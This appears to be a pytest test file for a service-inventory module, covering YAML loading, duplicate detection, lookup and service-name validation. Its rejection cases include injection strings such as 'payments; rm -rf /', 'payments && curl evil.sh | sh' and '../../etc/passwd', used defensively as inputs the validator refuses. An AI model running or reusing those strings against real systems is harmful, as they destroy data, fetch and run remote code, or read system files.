import pytest
from pathlib import Path

from decommission.inventory import (
    InventoryError,
    find_service,
    load_inventory,
    validate_service_name,
)


def write_yaml(tmp_path: Path, content: str) -> Path:
    p = tmp_path / "services.yaml"
    p.write_text(content)
    return p


def test_load_inventory_ok(tmp_path):
    p = write_yaml(tmp_path, "- name: payments\n  owner: team-pay\n  tier: critical\n")
    records = load_inventory(p)
    assert len(records) == 1
    assert records[0].name == "payments"
    assert records[0].owner == "team-pay"


def test_load_inventory_missing_file(tmp_path):
    with pytest.raises(InventoryError):
        load_inventory(tmp_path / "nope.yaml")


def test_load_inventory_not_a_list(tmp_path):
    p = write_yaml(tmp_path, "name: payments\n")
    with pytest.raises(InventoryError):
        load_inventory(p)


def test_load_inventory_duplicate(tmp_path):
    p = write_yaml(tmp_path, "- name: payments\n- name: payments\n")
    with pytest.raises(InventoryError):
        load_inventory(p)


@pytest.mark.parametrize("name", ["payments", "auth-service", "a", "svc123"])
def test_validate_service_name_accepts(name):
    validate_service_name(name)  # should not raise


@pytest.mark.parametrize(
    "name",
    [
        "payments; rm -rf /",
        "payments && curl evil.sh | sh",
        "-leading-hyphen",
        "trailing-hyphen-",
        "UPPERCASE",
        "has_underscore",
        "",
        "../../etc/passwd",
    ],
)
def test_validate_service_name_rejects_unsafe_input(name):
    with pytest.raises(InventoryError):
        validate_service_name(name)


def test_find_service_unknown_raises(tmp_path):
    p = write_yaml(tmp_path, "- name: payments\n")
    records = load_inventory(p)
    with pytest.raises(InventoryError):
        find_service(records, "not-in-inventory")
